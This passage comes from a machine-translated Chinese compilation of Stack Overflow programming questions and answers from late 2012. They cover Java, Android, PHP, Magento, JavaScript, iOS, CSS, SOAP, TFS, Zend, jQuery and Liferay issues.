      return null;

    }

    int transparency = src.getColorModel().getTransparency();
    BufferedImage dest =  gc.createCompatibleImage(
                              src.getWidth(), src.getHeight(), transparency );
    Graphics2D g2d = dest.createGraphics();

    AffineTransform origAT = g2d.getTransform(); 

    AffineTransform rot = new AffineTransform(); 
    rot.rotate(Math.toRadians(angle), src.getWidth()/2, src.getHeight()/2); 
    g2d.transform(rot); 

    g2d.drawImage(src, 0, 0, null);   

    g2d.setTransform(origAT);   
    g2d.dispose();

    return dest; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T08:51:28.580

> 随着较小的角度参数，这变得越来越扭曲。

听起来你在做：

```
 img = base_img;
 for (i = 0; i < n; i++) {
   img = rotate(img, theta);
 } 
```

当你真正想做的时候：

```
for (i = 0; i < n; i++) {
  img = rotate(base_img, theta * n);
} 
```

但我可能会做出不真实的假设。

# java - 想获取php数据到android

> ID：14097858
> 
> 赞同：2
> 
> 时间：2012-12-31T05:36:41.990
> 
> 标签：java, php, android, mysql, json

我的 LogCat 错误是：

```
 12-31 10:42:42.534: W/dalvikvm(292): threadid=3: thread exiting with uncaught exception (group=0x4001b188)
12-31 10:42:42.544: E/AndroidRuntime(292): Uncaught handler: thread main exiting due to uncaught exception
12-31 10:42:42.764: E/AndroidRuntime(292): java.lang.NullPointerException
12-31 10:42:42.764: E/AndroidRuntime(292):  at com.example.visit.record.My_Task$GetTaskDetails.onPostExecute(My_Task.java:204)
12-31 10:42:42.764: E/AndroidRuntime(292):  at com.example.visit.record.My_Task$GetTaskDetails.onPostExecute(My_Task.java:1)
12-31 10:42:42.764: E/AndroidRuntime(292):  at android.os.AsyncTask.finish(AsyncTask.java:417)
12-31 10:42:42.764: E/AndroidRuntime(292):  at android.os.AsyncTask.access$300(AsyncTask.java:127)
12-31 10:42:42.764: E/AndroidRuntime(292):  at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:429)
12-31 10:42:42.764: E/AndroidRuntime(292):  at android.os.Handler.dispatchMessage(Handler.java:99)
12-31 10:42:42.764: E/AndroidRuntime(292):  at android.os.Looper.loop(Looper.java:123)
12-31 10:42:42.764: E/AndroidRuntime(292):  at android.app.ActivityThread.main(ActivityThread.java:4363)
12-31 10:42:42.764: E/AndroidRuntime(292):  at java.lang.reflect.Method.invokeNative(Native Method)
12-31 10:42:42.764: E/AndroidRuntime(292):  at java.lang.reflect.Method.invoke(Method.java:521)
12-31 10:42:42.764: E/AndroidRuntime(292):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:860)
12-31 10:42:42.764: E/AndroidRuntime(292):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:618)
12-31 10:42:42.764: E/AndroidRuntime(292):  at dalvik.system.NativeStart.main(Native Method)
12-31 10:42:42.784: I/dalvikvm(292): threadid=7: reacting to signal 3
12-31 10:42:42.784: E/dalvikvm(292): Unable to open stack trace file '/data/anr/traces.txt': Permission denied
12-31 10:42:46.564: I/Process(292): Sending signal. PID: 292 SIG: 9
12-31 10:42:47.574: D/dalvikvm(315): GC freed 604 objects / 50648 bytes in 108ms 
```

在我的应用程序中，我试图在 php 上使用 JSON 从 Mysql 数据库中获取数据。我对其进行编码以使用 JSONParser 在 android 中获取客户姓名、联系电话、票号和任务详细信息。但不幸的是没有得到适当的结果:(谁能告诉我我哪里出错了，为什么不能从数据库中获取数据？我是否在 php 中使用任何其他请求？也请查看我的 php 代码。我将非常感激如果您指出我的错误并指导我，请给您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:43:48.800

这里

```
if(method == "POST") 
```

您`==`用于比较无效的字符串包含，因为`==`如果要比较包含值，则用于比较对象引用，然后使用 String.equals 为：

```
if(method.equals( "POST")) 
```

或使用`equalsIgnoreCase`

```
if(method.equalsIgnoreCase( "POST")) 
```

# magento - 如何在 Magento 自定义模块中设置产品数量？

> ID：14097859
> 
> 赞同：0
> 
> 时间：2012-12-31T05:36:53.760
> 
> 标签：magento, count, product

嗨，我已经尝试了几个小时来简单地设置畅销模块中显示的产品数量。没运气！

我已经搜索并没有在网上找到这个特定问题的答案。

这个网站[http://www.jimcode.org/2011/04/magento-setting-columns-limiting-products-shown-grid/](http://www.jimcode.org/2011/04/magento-setting-columns-limiting-products-shown-grid/)接近但我就是不明白。

这是“我的”代码：

```
<?php if($this->getItemCollection() && $this->getItemCollection()->getSize()): ?>
<div class="block">
    <div class="block-title">
        <strong><span><?php echo $this->__('Top Sellers In This Category') ?></span></strong>
    </div>
    <div class="block-content">
    <?php  $this->setColumnCount(1); // uncomment this line if you want to have another number of columns ?>
    <?php $this->resetItemsIterator() ?>
    <?php for($_i=0;$_i<$this->getRowCount();$_i++): ?>
        <tr>
        <?php for($_j=0;$_j<$this->getColumnCount();$_j++): ?>
            <?php if($_link=$this->getIterableItem()): ?>
                            <div class="img" style="float:left;width:212px">
                                <a href="<?php echo $_link->getProductUrl() ?>"><img src="<?php echo $this->helper('catalog/image')->init($_link, 'small_image')->constrainOnly(TRUE)->keepAspectRatio(TRUE)->keepFrame(FALSE)->resize(193); ?>" width="193" height="" alt="<?php echo $this->htmlEscape($_link->getName()) ?>" /></a>                                                                          
                            </div>
                            <div class="text" style="float:left;width:212px;margin-top:-60px"><img  style="width:45px;height:64px;position:relative;z-index:15;right:0px;bottom:260px" src="<?php echo $this->getSkinUrl('images/ribbon.png'); ?>" />
                                <div class="title"><a href="<?php echo $_link->getProductUrl() ?>"><?php echo $this->htmlEscape($_link->getName()) ?></a></div>
                                No: <?php echo $this->htmlEscape($_link->getSku()) ?>
                                <div class="price"></div>
                                <a href="<?php echo $this->getAddToCartUrl($_link) ?>" class="arr">Add to Cart</a>
                            </div>
                <?php else: ?>
                <td class="empty-product">&nbsp;</td>
                <?php endif; ?>
        <?php endfor; ?>
        </tr>
<?php
/*        <?php if($_i+2<=$this->getRowCount()): ?>
            <tr>
                <td class="spacer" colspan="6"><div class="separatorsmall"></div></td>
            </tr>
          <?php endif; ?>
*/
?>    <?php endfor; ?>
    </div>
</div>
<?php endif; ?> 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T12:46:31.123

您可以通过添加将集合的大小限制为例如 40 `$this->getItemCollection()->getSelect()->limit(40)`。

# javascript - 如何让敌人在短时间内射击？

> ID：14097861
> 
> 赞同：0
> 
> 时间：2012-12-31T05:37:06.147
> 
> 标签：javascript, vector, 3d, webgl, frame-rate

我正在开发一款 FPS 游戏。你可以在这里看到它[部署在 Heroku 上](http://still-escarpment-3701.herokuapp.com/)（加载大约需要十秒钟，所以请稍候）。

玩家可以正确射击，但敌人不能，即使他们使用相同的逻辑。

子弹在射击函数被调用后就饱和了。我需要敌人以适当的延迟射击子弹，就像玩家射击时发生的那样。

这是我的代码。

```
 bulletTempEnemy = new J3D.Transform();

   bulletTempEnemy.geometry = J3D.Primitive.Sphere(0.5, 4, 4);
   bulletTempEnemy.renderer = J3D.BuiltinShaders.fetch("Normal2Color");

   bulletHolderEnemy = new J3D.Transform();

engine.scene.add(bulletHolderEnemy);

 function EnemyShooting(){

 bulletHolderEnemy.position.x =swat2.position.x;
 bulletHolderEnemy.position.y =swat2.position.y;
 bulletHolderEnemy.position.z =swat2.position.z;

  var b = bulletTempEnemy.clone();

  var f =v3.sub(first_person_controller.position,swat2.position).norm();
  b.direction = new v3(); 
  b.direction=f;

b.position.fromArray(f);
b.progress = 0;
b.ttl = 50;

b.animate = function() {
b.position = b.direction.cp().mult(1 + b.progress);
b.progress += 1;
b.ttl--;            

            if(b.ttl == 0) {
                bulletHolderEnemy.remove(b);
                             }
        }

        bulletHolderEnemy.add(b);
  } 
```

下面的代码在游戏循环函数中被调用`draw()`：

```
 var zdis= Math.abs(Math.abs(Math.abs(swat2.position.z) -  Math.abs(first_person_controller.position.z)));
 var xdis= Math.abs(Math.abs(Math.abs(swat2.position.x) - Math.abs(first_person_controller.position.x)));

if(xdis < 80)
{
    setInterval(EnemyShooting(), 90000);

}

   for(var i = 0; i < bulletHolderEnemy.numChildren; i++) {
    bulletHolderEnemy.childAt(i).animate();
 } 
```

我正在使用[J3D 库](https://github.com/drojdjou/J3D)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:38:42.930

要在调用函数之前等待一定的时间，请参阅[https://developer.mozilla.org/en/docs/DOM/window.setTimeout](https://developer.mozilla.org/en/docs/DOM/window.setTimeout)

要阻止敌人射击子弹，您应该使用`clearInterval`.

```
var enemyInterval = null;

...

if (xdis < 80 && enemyInterval == null) {
    enemyInterval = enemysetInterval(EnemyShooting(), 90000);
}
if (xdis >= 80 && enemyInterval != null) {
    clearInterval(enemyInterval);
} 
```

请注意，使用您当前的代码，如果您`setInterval(EnemyShooting(), 90000);`在更新方法中连续调用，事情将继续创建更多“计时器” - 您可能只需要一个。

# java - 为什么函数 getKey、getValue 和 setValue 不与 Map 关联？

> ID：14097864
> 
> 赞同：2
> 
> 时间：2012-12-31T05:37:53.010
> 
> 标签：java

根据 Effective Java，第 22 条，

> 许多 Map 实现对于 map 中的每个键值对都有一个内部 Entry 对象。虽然每个条目都与映射相关联，但条目上的方法（getKey、getValue 和 setValue）不需要访问映射。

你能解释一下这是什么意思吗？您能否举一个典型的 Map 实现示例来说明这些函数如何不依赖于 Map 内部？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:50:47.967

这是 java.util.HashMap.Entry 实现

```
static class Entry<K,V> implements Map.Entry<K,V> {
        final K key;
        V value;
        Entry<K,V> next;
        final int hash;

        ...

        public final K getKey() {
            return key;
        }

        public final V getValue() {
            return value;
        }

        public final V setValue(V newValue) {
            V oldValue = value;
            value = newValue;
            return oldValue;
        }
        ... 
```

如您所见，getKey、getValue 和 setValue 仅适用于 Entry 的字段，不需要访问 HashMap 本身。

但是 HashMap 当然需要访问它的条目，所以它将它们作为一个数组保存在一个字段中

```
public class HashMap<K,V> extends AbstractMap<K,V> implements Map<K,V>, Cloneable, Serializable {
    ...
    Entry[] table;
    ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:54:59.163

地图由许多`Entry`对象组成。您可以将 Entry 视为键值对。

它是 Map 包含条目，而条目对 Map 没有任何访问权限。

条目可以访问它自己的字段，但不能访问哈希图中的其他条目，即条目可以为其自己包含的字段提供getter 和setter，并且不能访问HashMap。

# iphone - 点击后如何突出显示电子邮件地址

> ID：14097865
> 
> 赞同：0
> 
> 时间：2012-12-31T05:37:58.220
> 
> 标签：iphone, objective-c, ios, uilabel, xcode4.5

在我的表格视图中，我有名字、姓氏、电子邮件地址和电话号码。我有网络服务，通过它我可以从服务器获取数据并将其显示在我的设备上。我有一个问题，我从服务器获取的数据正在完美显示，但有些电子邮件地址很长，因此可以看到一半的电子邮件地址后跟点点（即 raboert.baderasam11@gma.. ..)。

有什么方法可以让我在点击电子邮件地址时看到其所有文本或标签突出显示，即完整的电子邮件地址？或任何突出显示电子邮件地址的工具提示？我希望它在单个视图中而不是多个视图中。这个任务必须完成。所以请帮助我。我对 iPhone 开发非常陌生。

```
 here is the code :-

 // Customize the appearance of table view cells.
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath: (NSIndexPath*)indexPath 
{    
    static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier];
    }
    NSArray* currentListOfItems=nil;
    Contact *aContact=nil;
    if(searching){
        currentListOfItems=searchResult;
        aContact=[searchResult objectAtIndex:indexPath.row];
    }else{
        currentListOfItems=content;
        aContact=[[[content objectAtIndex:indexPath.section] objectForKey:@"rowValues"]
          objectAtIndex:indexPath.row];
    }
    cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle 
    reuseIdentifier:CellIdentifier];
    UILabel *lbl3 = [[UILabel alloc]initWithFrame:CGRectMake(12, 0, 150, 20)];
    [lbl3 setTextColor:[UIColor blackColor]];
    [lbl3 setFont:[UIFont boldSystemFontOfSize:16.0]];
    lbl3.text =[NSString stringWithFormat:@"%@ %@", aContact.lastName,aContact.firstName];
    [cell addSubview:lbl3];
    UILabel *lbl1 = [[UILabel alloc]initWithFrame:CGRectMake(12, 20, 200, 20)];
    [lbl1 setTextColor:[UIColor blackColor]];
    [lbl1 setFont:[UIFont boldSystemFontOfSize:12.0]];
    lbl1.text = aContact.email;
    [cell addSubview:lbl1];
    UILabel *lbl2 = [[UILabel alloc]initWithFrame:CGRectMake(210, 20, 300, 20)];
    [lbl2 setTextColor:[UIColor grayColor]];
    [lbl2 setFont:[UIFont fontWithName:@"Arial" size:12.0]];
    lbl2.text = [NSString stringWithFormat:@"%@%@", @"| ",aContact.phone] ;
    [cell addSubview:lbl2];
    return cell;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T10:16:53.900

当用户触摸它时，您可以使用电子邮件地址更改标签的宽度。`userInteractionEnabled`要接收标签上的触摸启用并添加一个`UITapGestureRecognizer`. 在手势识别器的方法中，将视图属性的宽度更改为手势识别器。

**编辑：**

默认情况下，标签不允许用户交互。为了接收手势，您必须像这样启用用户交互

```
myLabel.userInteractionEnabled = YES; 
```

要添加一个`UITapGestureRecognizer`，请执行以下操作：

```
UITapGestureRecognizer *tapGestureRecognizer = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(lableWasTapped:)];
[myLabel addGestureRecognizer:tapGestureRecognizer]; 
```

要对水龙头做出反应，请执行以下操作：

```
- (void)lableWasTapped:(UITapGestureRecognizer*)sender {
    UILabel *label = (UILabel*)sender.view;
    CGSize labelSize = [label.text sizeWithFont:label.font];
    CGRect labelFrame = label.frame;
    labelFrame.size.width = labelSize.width;
    label.frame = labelFrame;
} 
```

# html - 不支持还是我做错了什么？

> ID：14097874
> 
> 赞同：0
> 
> 时间：2012-12-31T05:38:42.837
> 
> 标签：html, css

所以我正在阅读 W3C 网站上的[CSS Values and Units Module Level 3](http://dev.w3.org/csswg/css3-values/#toggle-notation)。在第 8.2 节中，它介绍了`toggle()`表达式，它可以循环使用不同的值，而不是对所有孩子使用相同的值。

我[试了一下](http://jsfiddle.net/DerekL/7J3Qk/)：

```
div{
    font-style: toggle(italic, normal);
    font-style: -webkit-toggle(italic, normal);  //Don't know if needed or not,
    font-style: -moz-toggle(italic, normal);     //Put it there in case
}​ 
```

但显然它不起作用。我想知道它现在是否不受支持，或者我做错了什么。支持8.1`calc()`节，也支持 8.3 节`attr()`，所以我认为这也是支持的。

我检查了[caniuse.com](http://caniuse.com/#search=toggle)，但没有运气。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:57:08.487

我认为它还没有任何支持：[http](http://css3clickchart.com/#toggle) ://css3clickchart.com/#toggle并且在 quirksmode 表上没有提及它.. 或者它在[MDN](https://developer.mozilla.org/en-US/docs/CSS/CSS_Reference)中。

# php - 在 SOAP 客户端上的 SOAP 函数内传递对象

> ID：14097882
> 
> 赞同：0
> 
> 时间：2012-12-31T05:40:02.663
> 
> 标签：php, web-services, soap, nusoap, soap-client

我需要从 PHP 平台调用soap WSDL。SOAP 请求由 SOAP 主体函数内的 SOAP 对象组成。

示例工作 SOAP 请求如下，

```
<SOAP-ENV:Envelope 
SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<ser:f1>
<a1>
<number xsi:type="xsd:string">720</number>
<newStatus xsi:type="xsd:string">2</newStatus>
</a1>
</ser:f1>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

f1 是一个 SOAP 函数，它是 this 中的另一个参数，即 a1。

我需要从 phpsoapclient 或 NuSOAP 调用它。

我下面的示例代码（NUSOAP）不起作用，

```
require_once "lib/nusoap.php";
$client = new nusoap_client("https://xxxx?wsdl");
$client->soap_defencoding = 'UTF-8';

$result = $client->call("f1", array("number" => "720","newStatus" => "2"),'',''); 
```

如果有人可以，请给我一个来自 php 或 NuSOAP 的 SOAPCLIENT 代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-02T02:56:14.140

试试这个：

```
$client = new nusoap_client($url, true); 
```

希望这有帮助:)

# tfs - 如何从托管 TFS 迁移到本地 TFS？

> ID：14097883
> 
> 赞同：6
> 
> 时间：2012-12-31T05:40:06.393
> 
> 标签：tfs, azure-devops, tfs-migration

如何从[http://tfs.visualstudio.com](http://tfs.visualstudio.com)上托管的 TFS 迁移到 TFS 的本地版本？我想使用[Visual Studio Team Foundation Server Express 2012](http://www.microsoft.com/en-us/download/details.aspx?id=30675)，它对 5 个用户免费。

是否可以迁移包括工作项、查询和源代码在内的所有内容？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T19:59:54.077

TFS 集成平台可以做到这一点，但它有其局限性。一个主要的问题是源历史是逐个变化地回放的，这意味着你失去了事情发生的原始日期。

Willy P Schaub 写了一篇出色的 msdn 杂志文章，介绍[了使用 TFS 集成工具从本地 Team Foundation Server 迁移到 Team Foundation Service Preview](http://msdn.microsoft.com/en-us/magazine/jj130558.aspx)，这与您想要的方向相反，但它应该是一个好的开始。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-07T10:10:33.450

您现在可以使用数据导出将数据从 VSO 移动到本地 TFS：http: [//msdn.microsoft.com/en-us/library/7cb80f0d-0119-4277-82e8-719a8db1796e](http://msdn.microsoft.com/en-us/library/7cb80f0d-0119-4277-82e8-719a8db1796e)

# php - Zend_Auth::getInstance() 不工作

> ID：14097884
> 
> 赞同：2
> 
> 时间：2012-12-31T05:40:11.763
> 
> 标签：php, zend-framework

我从过去 2 天开始一​​直在努力解决以下问题，但仍然无法解决。

[在http://akrabat.com/zend-auth-tutorial/](http://akrabat.com/zend-auth-tutorial/)的帮助下，我正在使用`Zend_Auth`Zend Framework 中的身份验证模块。成功认证后，我使用存储用户数据`getStorage()`；

例子 ：

`AuthController.php`

在`_process`我这样写的方法中：

```
protected function _process($values) {
        // Get our authentication adapter and check credentials        
        $adapter = $this->_getAuthAdapter();
        $adapter->setIdentity($values['username']);
        $adapter->setCredential($values['password']);

        $auth = Zend_Auth::getInstance();             
        $result = $auth->authenticate($adapter);

        if ($result->isValid()) {
            $user = $adapter->getResultRowObject();
            $auth->getStorage()->write($user);                            
            return true;
        }
        return false;
    } 
```

`print_r($user)`显示结果：

```
stdClass Object ( [id] => 1 [username] => admin [password] => cb3aefbdffbc81588f3d43c394428b16d4346b44 [salt] => ce8d96d579d389e783f95b3772785783ea1a9854 [role] => administrator [date_created] => 2012-12-29 11:04:40) 
```

还，

```
 print_r($auth->getStorage()->read()); 
```

这也向我展示了结果。

现在，如果用户成功登录，我想显示`Logout`链接。

`view\helpers\LoggedInAs.php`

```
 class Zend_View_Helper_LoggedInAs extends Zend_View_Helper_Abstract {

    public function loggedInAs() {
        $auth = Zend_Auth::getInstance();
        if ($auth->hasIdentity()) {
            $username = $auth->getIdentity()->username;
            $logoutUrl = $this->view->url(array('controller' => 'auth',
                'action' => 'logout'), null, true);
            return 'Welcome ' . $username . '. <a href="' . $logoutUrl . '">Logout</a>';
        }

        $request = Zend_Controller_Front::getInstance()->getRequest();
        $controller = $request->getControllerName();
        $action = $request->getActionName();
        if ($controller == 'auth' && $action == 'index') {
            return '';
        }
        $loginUrl = $this->view->url(array('controller' => 'login', 'action' => 'index'));
        return '<a href="' . $loginUrl . '">Login</a>';
    }

} 
```

但它没有调用该方法，`hasIdentity`这就是为什么它不去`if`块和

`print_r($auth)`显示这样的输出：

`Zend_Auth Object ( [_storage:protected] => )`

如果我这样做，`print_r($_SESSION);`那么它也会显示空白数组。问题是`$_SESSION`在控制器和模块中工作，但在`view/helpers`其中显示空白数组。

`Bootstrap.php`

```
protected function _initSession() {
    try {
        Zend_Session::start();
    } catch (Zend_Session_Exception $e) {
        session_start();
    }
} 
```

我正在使用 Zend 框架版本`1.11`。

我不确定这是`Session`or `Zend_Auth::getInstance()`or的问题`view helpers`。

由于这个问题，我无法继续学习`Zend_ACL`模块。我怎样才能解决这个问题。

任何帮助，将不胜感激。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:06:26.063

把下面的代码放在你的`view helper`课上......`view\helpers\LoggedInAs.php`

```
/**
 * @see Zend_Session
 */
require_once 'Zend/Session.php';

/**
 * @see Zend_View_Helper_Abstract
 */
require_once 'Zend/View/Helper/Abstract.php'; 
```

# jquery - 鼠标移出时尝试鼠标按下

> ID：14097885
> 
> 赞同：0
> 
> 时间：2012-12-31T05:40:17.093
> 
> 标签：jquery

我正在尝试专门为我正在创建的下拉菜单创建一个事件。如果它是可见的`.is(":visible")`，除了菜单本身之外，任何点击的地方都会关闭它。

- - 编辑 - -

这是行不通的。其他代码工作正常。并且`.on()`工作得很好，但是下面的代码并没有给我想要的东西。

```
$(document).on("mouseout", "#menuPopUp", function(){
   $(document).on("mousedown", function(){
      $("#menuPopUp").hide();
   });
}); 
```

`#menuPopUp`当单击除自身之外的任何内容时，我试图隐藏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T07:50:01.430

尝试在 mouseover/mouseout 上添加/删除一个类，然后在 click 事件中对其进行测试；这些方面的东西：

```
$("#menuPopUp").mouseover(function() {
   $(this).addClass("menuover"); 
});

$("#menuPopUp").mouseout(function() {
   $(this).removeClass("menuover"); 
});

$(document).on("mousedown", function(){
    if($("#menuPopUp").is(":visible") && !$("#menuPopUp").hasClass("menuover")) {
        $("#menuPopUp").hide();
    }
}); 
```

​</p>

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T07:12:36.660

您是否尝试过这种方式：http: **[//jsfiddle.net/tTkAB/1/](http://jsfiddle.net/tTkAB/1/)**

```
$(document).on("mousedown", "#headerPicMenu", function() {
    if ($("#menuPopUp").is(":visible")) {
       $("#menuPopUp").hide();
    } else {
       $("#menuPopUp").show();
    }
});

$(document).on("mouseout", "#menuPopUp", function() {
    if ($("#menuPopUp").is(":visible")) {
       $("#menuPopUp").hide();
    } else {
       $("#menuPopUp").show();
    }
});

$("#menuPopUp").on('mousedown', function() {
   $(this).mousedown();
}); 
```

更新了答案和小提琴。

# iphone - Display a message before exiting the iOS app?

> ID：14097889
> 
> 赞同：1
> 
> 时间：2012-12-31T05:41:05.727
> 
> 标签：iphone, ios, terminate

Is there any method that I could display a message before sending the app to the background by pressing the home button?

And the app should be stays in the foreground until the user responds to the message being displayed.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-31T06:01:39.763

though you cant stop ur app from going to background, I have a thought...

you can schedule a `UILocalNotificaiton` in `applicationWillEnterBackground` and trigger it immediately. Your app will surely move to background but this way you can display ur message there and if user interacts with your message with "Action" button rather than "Cancel", your application will return back in active state.

just sharing my thought.. might be of ur help as I don't exactly know what's ur purpose behind such implementation.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T05:42:40.953

Not possible. Once the home button is pressed you lose control of the app and there isn't really anything you can do about it.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-31T05:51:58.627

You can't do this.

As you will press home button, then you will loose control of your app. And also apple will not allowed to do changes with basic device features.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-31T05:47:45.620

Answer for your question is : No Way!

There is no Apple-supported method to terminate your application programmatically with an Alert.

When an iPhone user presses the Home button, he will be well aware that he needs to quit ! So "a message" make no sense there!

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-31T06:30:08.383

Try `applicationWillResignActive` in `ApplicationDelegate.m`, and use `performSelector:@selector(showAlert:) waitUntilDone:YES.`

I am not sure that will work, but you try with that. And, you may also want to assign the alert's delegate for action on some button press.

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-12-31T06:45:18.493

You can do this by your own logic. Add `UIAlertView` in `applicationWillEnterBackground`, and in response of `UIAlertView` you can take action whether to go to background or stay in foreground.

# javascript - Chrome 调试控制台未显示此代码的“脚本”选项卡

> ID：14097890
> 
> 赞同：0
> 
> 时间：2012-12-31T05:41:07.270
> 
> 标签：javascript, google-chrome, console

Chrome 调试控制台（Chrome 版本 23.0.1271.97）未显示此代码的“脚本”选项卡。我有一段更复杂的代码需要调试，但是，我必须克服 Chrome 控制台问题，所以我提供了这个示例。对此的任何帮助将不胜感激。谢谢！

```
<!doctype html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Draggable objects</title>
<script type="text/javascript">

var bMouseUp = true, oDragging, nMouseX, nMouseY, nStartX, nStartY, nZFocus = 100 /* the highest z-Index present 

in     your page plus 1 */;

function dragDown(oPssEvt1) {
var bExit = true, oMsEvent1 = oPssEvt1 || /* IE */ window.event;
for (var iNode = oMsEvent1.target; iNode; iNode = iNode.parentNode) {
if (iNode.className === "draggable") { bExit = false; oDragging = iNode; break; }
}
if (bExit) { return; }
bMouseUp = false;
nStartX = nStartY = 0;
for (var iOffPar = oDragging; iOffPar; iOffPar = iOffPar.offsetParent) {
nStartX += iOffPar.offsetLeft;
nStartY += iOffPar.offsetTop;
}
nMouseX = oMsEvent1.clientX;
nMouseY = oMsEvent1.clientY;
oDragging.style.zIndex = nZFocus++;
return false;
}

function dragMove(oPssEvt2) {
if (bMouseUp) { return; }
var oMsEvent2 = oPssEvt2 || /* IE */ window.event;
oDragging.style.left = String(nStartX + oMsEvent2.clientX - nMouseX) + "px";
oDragging.style.top = String(nStartY + oMsEvent2.clientY - nMouseY) + "px";
}

function dragUp() { bMouseUp = true; }

document.onmousedown = dragDown;
document.onmousemove = dragMove;
document.onmouseup = dragUp;

</script>

<style type="text/css">
.draggable {
position: fixed;
left: 0;
top: 0;
width: auto;
height: auto;
cursor: move;
}

#myDiv {
width: 300px;
height: 200px;
left: 200px;
top: 200px;
background-color: #00ff00;
}
</style>
</head>

<body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:34:14.660

我的 chrome 版本是 25.0.1364.5 开发版。在 Max osX 中

所以，我只是猜测，您的 HTML-dom 结构会有一些问题。如果没有，您可以打开 Tab-"sources" ，然后选择要调试的文件（窗口左侧的 Sources）。

鼠标事件太多了，可以考虑chrome上的“Remote-debug”

[https://developers.google.com/chrome-developer-tools/docs/remote-debugging](https://developers.google.com/chrome-developer-tools/docs/remote-debugging)

# liferay-6 - 在 liferay 中创建自定义登录页面的最佳方法是什么

> ID：14097896
> 
> 赞同：3
> 
> 时间：2012-12-31T05:41:50.517
> 
> 标签：liferay-6

我已经下载了带有 tomcat 包的 liferay 6 并安装了它。当我点击默认的 liferay url 时，我被重定向到 Liferay 登录页面。但我的要求是

```
1)I should redirect to the login page of my own when clicks on the sigin button.
2)After clicking on submit button of login page , the user will get authenicated against "Login" table created by me.
3)After authentication the user will redirect to Liferay landing page. 
```

如果适用于这种要求，请分享一些示例代码。这对我来说非常紧急。如果这不是放置 Liferay 相关问题的正确位置，请给我链接以发布我的问题。谢谢。

嗨 Vikas，我正在根据您的回答编辑问题。

我创建了一个带有以下步骤的钩子。

1）在 Eclipse IDE 文件 - 新建 - 项目 - LiferayProject - 单击下一步按钮，然后给定项目名称，然后选择钩子复选框并单击完成按钮。

2）在 liferay-hook.xml 我添加了 /WEB-INF/jsps

3）我创建了以下目录结构。登录挂钩/docroot/WEB-INF/jsps/html/portlet/login/login.jsp

4）在 login.jsp 中，我放置了 liferay-portal6.1/tomcat-7.0.27/webapps/ROOT/html/portlet/login/login.jsp 文件的代码。

当我这样做时，它会在我的 jsp 文件中显示很多红色标记，例如 HtmlUtil 无法解析。像这样它显示了很多错误。我在这里做错什么了吗。请让我知道问题。我很新给liferay。谢谢。

嗨 Vikas。这是我在 login.jsp 中使用的代码。

```
<HTML>
    <HEAD>
        <TITLE>Login using jsp</TITLE>
    </HEAD>
    <BODY>
        <H1>LOGIN FORM</H1>
            <form>
                <table>
                    <tr>
                        <td> Username  : </td><td> <input name="username" size=15 type="text" /> </td> 
                    </tr>
                    <tr>
                        <td> Password  : </td><td> <input name="password" size=15 type="text" /> </td> 
                    </tr>
                </table>
                <input type="submit" value="login" />
            </form>
    </BODY>
</HTML> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:55:28.570

`1.`创建一个`hook`覆盖 Liferay 的默认登录页面

`2.`门户可以根据用户的电子邮件地址、屏幕名称或用户 ID 对用户进行身份验证。这是设置在`portal-ext.properties`

```
 company.security.auth.type=emailAddress  //This enables authentication to happen through Email Address
    #company.security.auth.type=screenName
    #company.security.auth.type=userId 
```

如果 Liferay 的下一个版本计划添加您现在要提供的名称的表格，那么添加您自己的表格可能会在将来导致问题！

`3.`设置`default.landing.page.path`为您希望用户在身份验证后登陆的任何路径。这是设置在`portal-ext.properties`. 它也可以通过 Admin 端口进行配置。

如果您正在寻找代码，请在[此处查看常见问题解答部分](https://stackoverflow.com/faq)

# php - 如何在 PHP 表单操作中修复“通知：未定义索引：”

> ID：14097897
> 
> 赞同：25
> 
> 时间：2012-12-31T05:41:50.500
> 
> 标签：php, forms, post

当我尝试将内容提交到我的表单时，我收到了以下错误消息。我该如何解决？

> 注意：未定义索引：第 4 行 D:\wamp\www\update.php 中的文件名

示例 Update.php 代码：

```
<?php

    $index = 1;
    $filename = $_POST['filename'];

    echo $filename;
?> 
```

而 $_POST['filename'] 来自另一个页面：

```
<?php
